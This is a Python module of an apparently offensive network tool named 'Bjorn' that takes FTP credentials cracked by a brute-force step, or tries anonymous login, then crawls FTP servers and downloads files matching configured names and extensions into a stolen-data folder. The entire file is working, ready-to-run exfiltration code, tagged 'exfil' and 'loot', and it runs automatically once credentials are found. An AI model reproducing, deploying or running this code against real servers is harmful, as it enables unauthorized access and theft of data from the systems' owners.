"""steal_files_ftp.py - Loot files from FTP servers using cracked or anonymous credentials."""

import os
import logging
import time
from threading import Timer
from typing import List, Tuple, Dict, Optional
from ftplib import FTP

from shared import SharedData
from logger import Logger

logger = Logger(name="steal_files_ftp.py", level=logging.DEBUG)

# Action descriptors
b_class  = "StealFilesFTP"
b_module = "steal_files_ftp"
b_status = "steal_files_ftp"
b_parent = "FTPBruteforce"
b_port   = 21
b_enabled = 1
b_action = "normal"
b_service = '["ftp"]'
b_trigger = 'on_any:["on_cred_found:ftp","on_service:ftp"]'
b_requires = '{"all":[{"has_cred":"ftp"},{"has_port":21}]}'
b_priority = 60
b_cooldown = 3600
b_timeout = 600
b_stealth_level = 5
b_risk_level = "high"
b_max_retries = 1
b_tags = ["exfil", "ftp", "loot", "files"]
b_category = "exfiltration"
b_name = "Steal Files FTP"
b_description = "Loot files from FTP servers using cracked or anonymous credentials."
b_author = "Bjorn Team"
b_version = "2.0.0"
b_icon = "StealFilesFTP.png"


class StealFilesFTP:
    def __init__(self, shared_data: SharedData):
        self.shared_data = shared_data
        self.ftp_connected = False
        self.stop_execution = False
        self._ip_to_identity: Dict[str, Tuple[Optional[str], Optional[str]]] = {}
        self._refresh_ip_identity_cache()
        logger.info("StealFilesFTP initialized")

    # -------- Identity cache (hosts) --------
    def _refresh_ip_identity_cache(self) -> None:
        self._ip_to_identity.clear()
        try:
            rows = self.shared_data.db.get_all_hosts()
        except Exception as e:
            logger.error(f"DB get_all_hosts failed: {e}")
            rows = []

        for r in rows:
            mac = r.get("mac_address") or ""
            if not mac:
                continue
            hostnames_txt = r.get("hostnames") or ""
            current_hn = hostnames_txt.split(';', 1)[0] if hostnames_txt else ""
            ips_txt = r.get("ips") or ""
            if not ips_txt:
                continue
            for ip in [p.strip() for p in ips_txt.split(';') if p.strip()]:
                self._ip_to_identity[ip] = (mac, current_hn)

    def mac_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[0]

    def hostname_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[1]

    # -------- Credentials (creds table) --------
    def _get_creds_for_target(self, ip: str, port: int) -> List[Tuple[str, str]]:
        """
        Return list[(user,password)] from DB.creds for this target.
        Prefer exact IP; also include by MAC if known. Dedup preserves order.
        """
        mac = self.mac_for_ip(ip)
        params = {"ip": ip, "port": port, "mac": mac or ""}

        by_ip = self.shared_data.db.query(
            """
            SELECT "user","password"
              FROM creds
             WHERE service='ftp'
               AND COALESCE(ip,'')=:ip
               AND (port IS NULL OR port=:port)
            """, params)

        by_mac = []
        if mac:
            by_mac = self.shared_data.db.query(
                """
                SELECT "user","password"
                  FROM creds
                 WHERE service='ftp'
                   AND COALESCE(mac_address,'')=:mac
                   AND (port IS NULL OR port=:port)
                """, params)

        seen, out = set(), []
        for row in (by_ip + by_mac):
            u = str(row.get("user") or "").strip()
            p = str(row.get("password") or "").strip()
            if not u or (u, p) in seen:
                continue
            seen.add((u, p))
            out.append((u, p))
        return out

    # -------- FTP helpers --------
    # Max file size to download (10 MB) - protects RPi Zero RAM
    _MAX_FILE_SIZE = 10 * 1024 * 1024
    # Max recursion depth for directory traversal (avoids symlink loops)
    _MAX_DEPTH = 5

    def connect_ftp(self, ip: str, username: str, password: str, port: int = b_port) -> Optional[FTP]:
        try:
            ftp = FTP()
            ftp.connect(ip, port, timeout=10)
            ftp.login(user=username, passwd=password)
            self.ftp_connected = True
            logger.info(f"Connected to {ip}:{port} via FTP as {username}")
            return ftp
        except Exception as e:
            logger.info(f"FTP connect failed {ip}:{port} {username}: {e}")
            return None

    def find_files(self, ftp: FTP, dir_path: str, depth: int = 0) -> List[str]:
        files: List[str] = []
        if depth > self._MAX_DEPTH:
            logger.debug(f"Max recursion depth reached at {dir_path}")
            return []
        try:
            if self.shared_data.orchestrator_should_exit or self.stop_execution:
                logger.info("File search interrupted.")
                return []
            ftp.cwd(dir_path)
            items = ftp.nlst()

            for item in items:
                if self.shared_data.orchestrator_should_exit or self.stop_execution:
                    logger.info("File search interrupted.")
                    return []

                try:
                    ftp.cwd(item)  # if ok -> directory
                    files.extend(self.find_files(ftp, os.path.join(dir_path, item), depth + 1))
                    ftp.cwd('..')
                except Exception:
                    # not a dir => file candidate
                    if any(item.endswith(ext) for ext in (self.shared_data.steal_file_extensions or [])) or \
                       any(name in item for name in (self.shared_data.steal_file_names or [])):
                        files.append(os.path.join(dir_path, item))
            logger.info(f"Found {len(files)} matching files in {dir_path} on FTP")
        except Exception as e:
            logger.error(f"FTP path error {dir_path}: {e}")
        return files

    def steal_file(self, ftp: FTP, remote_file: str, base_dir: str) -> None:
        try:
            # Check file size before downloading
            try:
                size = ftp.size(remote_file)
                if size is not None and size > self._MAX_FILE_SIZE:
                    logger.info(f"Skipping {remote_file} ({size} bytes > {self._MAX_FILE_SIZE} limit)")
                    return
            except Exception:
                pass  # SIZE not supported, try download anyway

            local_file_path = os.path.join(base_dir, os.path.relpath(remote_file, '/'))
            os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
            with open(local_file_path, 'wb') as f:
                ftp.retrbinary(f'RETR {remote_file}', f.write)
            logger.success(f"Downloaded {remote_file} -> {local_file_path}")
        except Exception as e:
            logger.error(f"FTP download error {remote_file}: {e}")

    # -------- Orchestrator entry --------
    def execute(self, ip: str, port: str, row: Dict, status_key: str) -> str:
        timer = None
        try:
            self.shared_data.bjorn_orch_status = b_class
            # EPD live status
            self.shared_data.comment_params = {"ip": ip, "port": str(port), "files": "0"}
            try:
                port_i = int(port)
            except Exception:
                port_i = b_port

            hostname = self.hostname_for_ip(ip) or ""
            self.shared_data.comment_params = {"ip": ip, "port": str(port_i), "hostname": hostname}

            creds = self._get_creds_for_target(ip, port_i)
            logger.info(f"Found {len(creds)} FTP credentials in DB for {ip}")

            def try_anonymous() -> Optional[FTP]:
                return self.connect_ftp(ip, 'anonymous', '', port=port_i)

            if not creds and not try_anonymous():
                logger.error(f"No FTP credentials for {ip}. Skipping.")
                return 'failed'

            def _timeout():
                if not self.ftp_connected:
                    logger.error(f"No FTP connection within 4 minutes for {ip}. Failing.")
                    self.stop_execution = True

            timer = Timer(240, _timeout)
            timer.start()

            mac = (row or {}).get("MAC Address") or self.mac_for_ip(ip) or "UNKNOWN"
            success = False

            # Anonymous first
            ftp = try_anonymous()
            if ftp:
                self.shared_data.comment_params = {"user": "anonymous", "ip": ip, "port": str(port_i), "hostname": hostname}
                files = self.find_files(ftp, '/')
                local_dir = os.path.join(self.shared_data.data_stolen_dir, f"ftp/{mac}_{ip}/anonymous")
                if files:
                    self.shared_data.comment_params = {"user": "anonymous", "ip": ip, "port": str(port_i), "hostname": hostname, "files": str(len(files))}
                    for remote in files:
                        if self.stop_execution or self.shared_data.orchestrator_should_exit:
                            logger.info("Execution interrupted.")
                            break
                        self.steal_file(ftp, remote, local_dir)
                    logger.success(f"Stole {len(files)} files from {ip} via anonymous")
                    success = True
                try:
                    ftp.quit()
                except Exception:
                    pass
                if success:
                    return 'success'

            # Authenticated creds
            for username, password in creds:
                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                    logger.info("Execution interrupted.")
                    break
                try:
                    self.shared_data.comment_params = {"user": username, "ip": ip, "port": str(port_i), "hostname": hostname}
                    logger.info(f"Trying FTP {username} @ {ip}:{port_i}")
                    ftp = self.connect_ftp(ip, username, password, port=port_i)
                    if not ftp:
                        continue
                    files = self.find_files(ftp, '/')
                    local_dir = os.path.join(self.shared_data.data_stolen_dir, f"ftp/{mac}_{ip}/{username}")
                    if files:
                        self.shared_data.comment_params = {"user": username, "ip": ip, "port": str(port_i), "hostname": hostname, "files": str(len(files))}
                        for remote in files:
                            if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                logger.info("Execution interrupted.")
                                break
                            self.steal_file(ftp, remote, local_dir)
                        logger.info(f"Stole {len(files)} files from {ip} as {username}")
                        success = True
                    try:
                        ftp.quit()
                    except Exception:
                        pass
                    if success:
                        return 'success'
                except Exception as e:
                    logger.error(f"FTP loot error {ip} {username}: {e}")

            return 'success' if success else 'failed'

        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'
        finally:
            self.shared_data.bjorn_progress = ""
            if timer:
                timer.cancel()
